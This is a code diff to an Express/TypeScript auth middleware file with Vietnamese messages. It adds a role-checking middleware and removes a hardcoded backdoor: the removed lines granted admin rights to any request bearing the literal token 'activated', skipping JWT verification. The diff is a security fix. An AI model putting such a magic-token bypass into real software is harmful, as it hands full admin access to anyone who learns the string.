@@ -23,21 +23,11 @@ export const optionalAuth = async (req: Request, res: Response, next: NextFuncti
     const token = authHeader && authHeader.split(" ")[1];
 
     if (token) {
-      if (token === "activated") {
-        req.user = {
-          _id: "user-admin-id",
-          id: "user-admin-id",
-          username: "admin",
-          role: "admin",
-          isActive: true,
-        };
-      } else {
-        const decoded: any = jwt.verify(token, config.jwtSecret);
-        const user = await User.findById(decoded.id).select("-password");
+      const decoded: any = jwt.verify(token, config.jwtSecret);
+      const user = await User.findById(decoded.id).select("-password");
 
-        if (user && user.isActive) {
-          req.user = user;
-        }
+      if (user && user.isActive) {
+        req.user = user;
       }
     }
   } catch (error) {
@@ -57,17 +47,6 @@ export const authenticateToken = async (req: Request, res: Response, next: NextF
 
     if (!token) {
       throw new UnauthorizedError("Token không được cung cấp");
-    }
-
-    if (token === "activated") {
-      req.user = {
-        _id: "user-admin-id",
-        id: "user-admin-id",
-        username: "admin",
-        role: "admin",
-        isActive: true,
-      };
-      return next();
     }
 
     const decoded: any = jwt.verify(token, config.jwtSecret);
@@ -109,6 +88,25 @@ export const requireAdmin = (req: Request, res: Response, next: NextFunction) =>
   }
 
   next();
+};
+
+/**
+ * Middleware kiểm tra vai trò hợp lệ (RBAC)
+ */
+export const requireRoles = (...allowedRoles: string[]) => {
+  return (req: Request, res: Response, next: NextFunction) => {
+    if (!req.user) {
+      return next(new UnauthorizedError("Vui lòng đăng nhập"));
+    }
+
+    if (!allowedRoles.includes(req.user.role)) {
+      return next(
+        new ForbiddenError("Tài khoản của bạn không có quyền thực hiện thao tác này")
+      );
+    }
+
+    next();
+  };
 };
 
 /**
